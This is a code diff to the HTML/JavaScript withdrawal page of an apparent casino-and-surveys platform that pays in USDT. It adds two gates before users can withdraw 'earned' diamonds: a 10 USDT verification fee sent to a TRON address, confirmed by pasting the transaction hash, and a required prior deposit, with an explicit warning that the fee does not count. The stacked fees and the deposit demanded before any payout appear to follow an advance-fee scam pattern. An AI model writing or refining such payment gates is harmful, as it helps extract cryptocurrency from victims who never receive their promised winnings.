@@ -1049,6 +1049,22 @@
           </button>
         </div>
 
+        <!-- ALERTA DE RESTRICCIÓN SI EL USUARIO NUNCA HA RECARGADO -->
+        <div class="unverified-restriction-card" id="noDepositRestrictionCard" style="display: none; border-left-color: #00f0ff; background: rgba(0, 240, 255, 0.07); border-color: rgba(0, 240, 255, 0.3);">
+          <div class="unverified-header">
+            <span class="unverified-icon" style="background: rgba(0, 240, 255, 0.15); color: #00f0ff;">💳</span>
+            <div>
+              <h4 style="color: #00f0ff;">RESTRICCIÓN DE SEGURIDAD: Se Requiere Al Menos 1 Recarga</h4>
+              <p>
+                Para habilitar solicitudes de retiro de ganancias obtenidas en el casino o encuestas, debes haber realizado <strong>al menos una recarga de saldo previa</strong> en tu cuenta. <span style="color: #ffb700;">*Nota: La tasa de verificación de cuenta no cuenta como recarga de saldo.</span>
+              </p>
+            </div>
+          </div>
+          <a href="./recargar.html" class="btn-verify-now" style="background: #00f0ff; color: #000; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-weight: 900;">
+            💎 IR A RECARGAR SALDO AHORA
+          </a>
+        </div>
+
         <form id="withdrawSubmitForm" style="display: flex; flex-direction: column; gap: 1.1rem;">
           
           <!-- Campo 1: Cantidad de Diamantes a Canjear (Mínimo 1,000 💎 = 100 USDT) -->
@@ -1293,6 +1309,21 @@
             </div>
           </div>
         </div>
+
+        <!-- Contenedor con dirección oficial y campo de Hash TRC-20 -->
+        <div id="verifyTrc20Box" style="display: none; background: #0c1527; border: 1px solid rgba(0, 240, 255, 0.25); border-radius: 8px; padding: 0.85rem; margin-top: 0.75rem; text-align: left;">
+          <div style="font-size: 0.74rem; color: #8e9bb0; margin-bottom: 0.35rem;">
+            Dirección TRON oficial (Red TRC-20):
+          </div>
+          <div style="display: flex; gap: 0.5rem; align-items: center; background: #070d18; padding: 0.5rem 0.65rem; border-radius: 6px; border: 1px solid rgba(255,255,255,0.1);">
+            <span id="verifyWalletAddress" style="font-family: monospace; font-size: 0.75rem; color: #00f0ff; word-break: break-all; flex: 1;">Cargando billetera...</span>
+            <button type="button" id="btnCopyVerifyWallet" style="background: rgba(0, 240, 255, 0.15); border: 1px solid #00f0ff; color: #00f0ff; border-radius: 4px; padding: 0.3rem 0.6rem; font-size: 0.72rem; cursor: pointer; font-weight: 800;">Copiar</button>
+          </div>
+          <div style="font-size: 0.73rem; color: #ffb700; margin: 0.65rem 0 0.25rem; font-weight: 700;">
+            Transfiere 10.00 USDT y pega el Hash de Transacción (TXID):
+          </div>
+          <input type="text" id="verifyTxHashInput" placeholder="Ej: 3c8e4a9b71d2..." style="width: 100%; box-sizing: border-box; background: #070d18; border: 1px solid rgba(255,255,255,0.15); border-radius: 6px; padding: 0.6rem 0.75rem; font-size: 0.8rem; color: #fff; font-family: monospace;" />
+        </div>
       </div>
 
       <button type="button" class="btn-submit-withdraw" id="btnConfirmPayVerification" style="margin-top: 1rem; width: 100%;">
@@ -1355,6 +1386,12 @@
               userState.cuenta_verificada = Boolean(data.cuenta_verificada);
               userState.is_verified = Boolean(data.cuenta_verificada);
             }
+            if (typeof data.primer_deposito_realizado !== 'undefined') {
+              userState.primer_deposito_realizado = Boolean(data.primer_deposito_realizado);
+            }
+            if (typeof data.tiene_recarga_aprobada !== 'undefined') {
+              userState.tiene_recarga_aprobada = Boolean(data.tiene_recarga_aprobada);
+            }
             localStorage.setItem(storageKey, JSON.stringify(userState));
             const topNavEl = document.getElementById('topNavDiamonds');
             if (topNavEl) topNavEl.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
@@ -1362,6 +1399,7 @@
             if (availEl) availEl.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
             const maxUsdtEl = document.getElementById('maxUsdtAvailable');
             if (maxUsdtEl) maxUsdtEl.textContent = '≈ ' + (userState.balance / DIAMOND_RATE).toFixed(2) + ' USDT';
+            renderVerificationStatus();
           }
         }
       } catch (_) {}
@@ -1380,35 +1418,52 @@
 
     // Referencias a elementos de verificación
     const unverifiedCard = document.getElementById('unverifiedRestrictionCard');
+    const noDepositCard = document.getElementById('noDepositRestrictionCard');
     const topBadge = document.getElementById('topVerificationBadge');
     const btnSubmitWithdraw = document.getElementById('btnSubmitWithdraw');
     const verificationModal = document.getElementById('verificationModal');
     const modalBalancePreview = document.getElementById('modalUserBalancePreview');
+    const verifyTrc20Box = document.getElementById('verifyTrc20Box');
 
     function renderVerificationStatus() {
       const isVerified = Boolean(userState.cuenta_verificada || userState.is_verified);
+      const hasDeposit = Boolean(userState.tiene_recarga_aprobada || userState.primer_deposito_realizado);
       
-      if (isVerified) {
-        if (topBadge) {
-          topBadge.className = 'verification-badge verified';
-          topBadge.innerHTML = '✓ Cuenta Verificada';
-          topBadge.title = 'Tu cuenta está verificada. Retiros a USDT TRC-20 habilitados.';
-        }
-        if (unverifiedCard) unverifiedCard.style.display = 'none';
-        if (btnSubmitWithdraw) {
-          btnSubmitWithdraw.classList.remove('locked');
-          btnSubmitWithdraw.innerHTML = '⚡ CONFIRMAR Y PROCESAR RETIRO A USDT';
-        }
-      } else {
+      if (!isVerified) {
         if (topBadge) {
           topBadge.className = 'verification-badge unverified';
           topBadge.innerHTML = '⚠️ No Verificada (Retiros Bloqueados)';
           topBadge.title = 'Haz clic para pagar y activar la verificación';
         }
         if (unverifiedCard) unverifiedCard.style.display = 'flex';
+        if (noDepositCard) noDepositCard.style.display = 'none';
         if (btnSubmitWithdraw) {
           btnSubmitWithdraw.classList.add('locked');
           btnSubmitWithdraw.innerHTML = '🔒 RETIRO BLOQUEADO (REQUIERE CUENTA VERIFICADA)';
+        }
+      } else if (!hasDeposit) {
+        if (topBadge) {
+          topBadge.className = 'verification-badge verified';
+          topBadge.innerHTML = '✓ Cuenta Verificada';
+          topBadge.title = 'Tu cuenta está verificada, pero requiere al menos 1 recarga previa';
+        }
+        if (unverifiedCard) unverifiedCard.style.display = 'none';
+        if (noDepositCard) noDepositCard.style.display = 'flex';
+        if (btnSubmitWithdraw) {
+          btnSubmitWithdraw.classList.add('locked');
+          btnSubmitWithdraw.innerHTML = '🔒 RETIRO BLOQUEADO (REQUIERE AL MENOS 1 RECARGA)';
+        }
+      } else {
+        if (topBadge) {
+          topBadge.className = 'verification-badge verified';
+          topBadge.innerHTML = '✓ Cuenta Verificada';
+          topBadge.title = 'Tu cuenta está verificada y habilitada para retiros a USDT TRC-20.';
+        }
+        if (unverifiedCard) unverifiedCard.style.display = 'none';
+        if (noDepositCard) noDepositCard.style.display = 'none';
+        if (btnSubmitWithdraw) {
+          btnSubmitWithdraw.classList.remove('locked');
+          btnSubmitWithdraw.innerHTML = '⚡ CONFIRMAR Y PROCESAR RETIRO A USDT';
         }
       }
 
@@ -1419,6 +1474,30 @@
 
     // Inicializar estado visual de verificación
     renderVerificationStatus();
+
+    // Cargar dirección oficial de TRON para el pago de verificación
+    async function loadVerificationWallet() {
+      try {
+        const res = await fetch(`${API_BASE}/wallet/direccion-recarga`);
+        if (res.ok) {
+          const d = await res.json();
+          const wEl = document.getElementById('verifyWalletAddress');
+          if (wEl && d.direccion_tron) {
+            wEl.textContent = d.direccion_tron;
+          }
+        }
+      } catch (_) {}
+    }
+    loadVerificationWallet();
+
+    document.getElementById('btnCopyVerifyWallet')?.addEventListener('click', () => {
+      const wEl = document.getElementById('verifyWalletAddress');
+      if (wEl && wEl.textContent) {
+        navigator.clipboard.writeText(wEl.textContent.trim()).then(() => {
+          showToast('Copiado', 'Dirección de billetera TRC-20 copiada al portapapeles.');
+        });
+      }
+    });
 
     // Eventos para abrir el modal de verificación
     topBadge?.addEventListener('click', () => {
@@ -1452,6 +1531,7 @@
       optTrc20.classList.remove('active');
       radioDiamonds.textContent = '●';
       radioTrc20.textContent = '○';
+      if (verifyTrc20Box) verifyTrc20Box.style.display = 'none';
     });
 
     optTrc20?.addEventListener('click', () => {
@@ -1460,6 +1540,7 @@
       optDiamonds.classList.remove('active');
       radioTrc20.textContent = '●';
       radioDiamonds.textContent = '○';
+      if (verifyTrc20Box) verifyTrc20Box.style.display = 'block';
     });
 
     // Confirmar y pagar la verificación de cuenta
@@ -1471,39 +1552,65 @@
           showToast('Saldo Insuficiente', `Necesitas al menos ${verifyFee} 💎 para pagar la verificación (Tu saldo: ${userState.balance.toLocaleString('en-US')} 💎).`, 'error');
           return;
         }
-        userState.balance -= verifyFee;
+
+        try {
+          const res = await fetch(`${API_BASE}/user/pagar-verificacion`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username: userState.username,
+              metodo: 'saldo_diamantes'
+            })
+          });
+          const d = await res.json();
+          if (d.error) {
+            showToast('Error', d.error, 'error');
+            return;
+          }
+          userState.balance -= verifyFee;
+          userState.cuenta_verificada = true;
+          userState.is_verified = true;
+          userState.fecha_verificacion = new Date().toISOString();
+          userState.metodo_verificacion = 'saldo_diamantes';
+          localStorage.setItem(storageKey, JSON.stringify(userState));
+          topNavDiamonds.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
+          lblMaxAvailable.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
+          updatePreview();
+          renderVerificationStatus();
+          verificationModal.classList.remove('open');
+          showToast('¡Cuenta Verificada!', 'Tu cuenta ha sido verificada exitosamente con tu saldo de diamantes.');
+        } catch (err) {
+          showToast('Error', 'No se pudo conectar con el servidor', 'error');
+        }
+      } else {
+        // Método USDT TRC-20
+        const txHash = document.getElementById('verifyTxHashInput')?.value.trim();
+        if (!txHash || txHash.length < 15) {
+          showToast('Hash Requerido', 'Por favor transfiere 10.00 USDT a la dirección oficial e ingresa el Hash / TXID de la transacción.', 'error');
+          return;
+        }
+
+        try {
+          const res = await fetch(`${API_BASE}/user/pagar-verificacion`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              username: userState.username,
+              metodo: 'usdt_trc20',
+              tx_hash: txHash
+            })
+          });
+          const d = await res.json();
+          if (d.error) {
+            showToast('Error', d.error, 'error');
+            return;
+          }
+          verificationModal.classList.remove('open');
+          showToast('Pago Registrado (PENDIENTE)', 'Tu pago de verificación de 10 USDT está en cola. Nuestro monitor de la red TRON lo verificará en breves minutos y activará tu cuenta automáticamente.');
+        } catch (err) {
+          showToast('Error', 'No se pudo conectar con el servidor', 'error');
+        }
       }
-
-      userState.cuenta_verificada = true;
-      userState.is_verified = true;
-      userState.fecha_verificacion = new Date().toISOString();
-      userState.metodo_verificacion = selectedVerifyMethod;
-
-      // Guardar en almacenamiento local
-      localStorage.setItem(storageKey, JSON.stringify(userState));
-
-      // Sincronizar con el backend Go si está activo
-      try {
-        await fetch(`${API_BASE}/user/pagar-verificacion`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            username: userState.username,
-            metodo: selectedVerifyMethod
-          })
-        });
-      } catch (err) {
-        console.log('Backend sync offline/fallback, local state active');
-      }
-
-      // Actualizar interfaz
-      topNavDiamonds.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
-      lblMaxAvailable.textContent = userState.balance.toLocaleString('en-US') + ' 💎';
-      updatePreview();
-      renderVerificationStatus();
-      verificationModal.classList.remove('open');
-
-      showToast('¡Cuenta Verificada!', 'Tu cuenta ha sido verificada exitosamente. Ahora puedes retirar tus ganancias a USDT (TRC-20) sin restricciones.');
     });
 
     // 2. Leer parámetros de URL (diamantes y usdt provenientes del dashboard; mínimo 1,000 💎 = 100 USDT)
@@ -1616,9 +1723,19 @@
       // =======================================================================
       const isVerified = Boolean(userState.cuenta_verificada || userState.is_verified);
       if (!isVerified) {
-        showToast('Retiro Bloqueado', 'Tu cuenta no está verificada. Debes pagar la tasa de verificación para poder retirar tus ganancias a USDT.');
+        showToast('Retiro Bloqueado', 'Tu cuenta no está verificada. Debes pagar la tasa de verificación para poder retirar tus ganancias a USDT.', 'error');
         renderVerificationStatus();
         verificationModal.classList.add('open');
+        return;
+      }
+
+      // =======================================================================
+      // RESTRICCIÓN OBLIGATORIA: AL MENOS 1 RECARGA DE SALDO PREVIA
+      // =======================================================================
+      const hasDeposit = Boolean(userState.tiene_recarga_aprobada || userState.primer_deposito_realizado);
+      if (!hasDeposit) {
+        showToast('Recarga Previa Requerida', 'Para poder solicitar retiros debes haber realizado al menos una recarga de saldo previa en tu cuenta (la verificación no cuenta como recarga).', 'error');
+        renderVerificationStatus();
         return;
       }
 
@@ -1669,9 +1786,9 @@
           })
         });
         backendData = await resp.json();
-        if (!resp.ok && backendData?.error) {
+        if (!resp.ok && (backendData?.error || backendData?.message)) {
           procModal.classList.remove('open');
-          showToast('Error en Solicitud', backendData.error);
+          showToast('Retiro No Permitido', backendData.message || backendData.error, 'error');
           return;
         }
       } catch (err) {
